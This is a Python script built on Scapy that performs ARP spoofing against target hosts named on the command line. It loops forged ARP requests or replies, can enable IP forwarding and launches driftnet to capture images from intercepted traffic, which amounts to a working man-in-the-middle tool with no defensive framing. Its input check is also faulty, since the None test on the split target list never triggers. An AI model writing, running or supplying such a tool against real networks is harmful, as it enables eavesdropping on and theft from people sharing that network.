from scapy.all import *
import optparse
import os

def send(pkt,interface):
    for p in pkt:
        sendp(p,iface=interface)

def req(targets,source):
    for target in targets:
        tr_mac=getmacbyip(target)
        pkt=Ether(dst=tr_mac)/ARP(pdst=target,psrc=source)
        yield pkt

def rep(targets,source):
    for target in targets:
        tr_mac=getmacbyip(target)
        pkt=Ether(dst=tr_mac)/ARP(pdst=target,psrc=source,op=2)
        yield pkt

def main():
    parser=optparse.OptionParser('%prog '+"[+]-i <interface> [+]-t <targets> [+]-s <source> [+]-m <mode> [+]-r <transmit>")
    parser.add_option('-i',dest='interface',default='eth0',type='string',help='[+]Interface(default eth0)')
    parser.add_option('-t',dest='targets',type='string',help='[+]Target host,split with \',\'')
    parser.add_option('-s',dest='source',type='string',help='[+]Source host')
    parser.add_option('-m',dest='mode',default='req',type='string',help='[+]Request(req) or Reply(rep)')
    parser.add_option('-r',dest='transmit',default='no',type='string',help='[+]Transmit(yes or no)')
    (options,args)=parser.parse_args()
    interface=options.interface
    targets=str(options.targets).split(',')
    source=options.source
    mode=options.mode
    transmit=options.transmit

    if((targets[0]==None) or (source==None)):
        print('[-]Please input targets and source')
        exit(0)

    if(transmit=='yes'):
        os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')
        os.system("gnome-terminal -- driftnet -i "+interface)

    if(mode=='req'):
        print('----------------')
        try:
            while True:
                pkt=req(targets,source)
                send(pkt,interface)
        except KeyboardInterrupt:
            print('---------------')
            os.system('echo 0 > /proc/sys/net/ipv4/ip_forward')
            print('Finished')
    else:
        print('-----------------')
        try:
            while True:
                pkt=rep(targets,source)
                send(pkt,interface)
        except KeyboardInterrupt:
            print('---------------')
            os.system('echo 0 > /proc/sys/net/ipv4/ip_forward')
            print('Finished!')

if __name__=='__main__':
    main()